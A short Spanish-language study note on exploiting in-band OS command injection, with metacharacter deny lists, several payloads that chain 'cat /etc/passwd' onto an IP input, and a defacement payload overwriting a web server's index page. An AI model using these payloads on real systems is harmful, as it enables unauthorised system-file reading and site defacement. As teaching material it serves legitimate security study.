# Fz3r0 OWASP 💀🐝 - Command Injection 💉

## 💀 ¿Cómo explotar vulnerabilidad CMDI?

Una vez que se encontró la vulnerabilidad `in-band` o `blind` se procede a explotar de las siguientes maneras: 

### 💣 `In-Band CMDI: exploitation`

1. 💥 Utilizar `shell metacharacters` como payload inicial:

````py
## General deny list to be included for command injection:
| ; & $ > < ' \ ! >> #

## Escape or filter special characters for --->>> Windows
( ) < > & * ‘ | = ? ; [ ] ^ ~ ! . " % @ / \ : + , `

## Escape or filter special characters for --->>> Linux
{ } ( ) > < & * ‘ | = ? ; [ ] $ – # ~ ! . " %  / \ : + , `

````

2. 💥 **Concatenar** comandos:

````py
## Concatena 127.0.0.1 + cat /etc/passwd + (concatena lo que sigue en el comando original con un &)

### Opción 1:
127.0.0.1 && cat /etc/passwd &

### Opción 2:
127.0.0.1 & cat /etc/passwd &

### Opción 3:
127.0.0.1 || cat /etc/passwd &

### Opción 4:
127.0.0.1 | cat /etc/passwd &

### Opción 4:
127.0.0.1 | cat /etc/passwd &

.
.
.

etc

````

- Algo un poco mas complejo como un `defacement` se podría ver algo así:

````sh
127.0.0.1 ; cp /var/www/index.html /var/www/index.bak && echo "Hola mundo, soy Fz3r0" > /var/www/index.html
````



## 📖 Recursos

- [Port Swigger - Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP - Command Injection Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [OWASP - Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)
- [Udemy - Rana Khalil | Command Injection ](https://www.udemy.com/course/mastering-command-injection-the-ultimate-hands-on-course/learn/lecture/39297722#overview)
